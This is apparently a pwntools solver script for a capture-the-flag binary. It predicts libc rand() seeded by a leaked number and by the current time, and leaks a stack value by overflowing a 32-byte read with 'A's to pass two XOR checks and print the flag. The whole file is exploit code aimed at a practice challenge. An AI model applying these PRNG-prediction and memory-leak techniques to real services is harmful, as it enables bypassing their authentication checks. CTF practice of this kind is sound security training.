from pwn import *
from ctypes import CDLL
import time
from re import *

elf = context.binary = ELF('./challenge')
context.log_level = "DEBUG"
libc = CDLL('libc.so.6')

io = process()

'''
#remove this comment when you connect to server
io = remote('34.126.117.161',2000)
io.recv() 
'''

recv = io.recv().decode()
num = int(re.findall(r'[0-9]{10}',recv)[0])

def find_buff(n):
    libc.srand(n)
    rd = libc.rand()
    expected_buf = rd ^ n ^ 0xDEADBEEFDEADC0DE
    expected_buf = expected_buf - 2**64 if expected_buf >= 2**63 else expected_buf
    return str(expected_buf).encode()

io.sendline()
io.recv()
io.sendline(find_buff(num))
io.recvline()
io.sendline(b'A'*32)
io.recvuntil(b'AAAA')

magic = u64(io.recvuntil(b'Pause',drop=True).strip(b'A'*32).strip())

io.recv()
#io.sendline()

current_time = int(libc.time(None))
libc.srand(current_time)
v6 = libc.rand()
expected_buf = v6 ^ magic ^ 0xDEADBEEFDEADC0DE
expected_buf = expected_buf - 2**64 if expected_buf >= 2**63 else expected_buf

io.sendline(str(expected_buf).encode())
io.recv()
print(io.recv().decode())